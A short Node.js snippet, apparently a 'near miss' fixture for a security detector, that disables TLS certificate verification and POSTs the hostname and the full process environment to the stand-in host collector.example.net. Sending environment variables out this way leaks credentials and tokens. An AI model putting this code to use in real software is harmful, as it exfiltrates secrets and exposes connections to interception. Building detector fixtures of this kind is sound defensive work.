// Near miss: TLS verification is disabled and a peer certificate is read,
// but the chain is never exported; the host data goes out in a POST body.
const https = require('https')
const os = require('os')
process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0'
const req = https.request({ hostname: 'collector.example.net', method: 'POST', path: '/in' }, res => {
  const cert = res.socket.getPeerCertificate(true)
  console.log(cert.subject)
})
req.write(JSON.stringify({ host: os.hostname(), env: process.env }))
req.end()
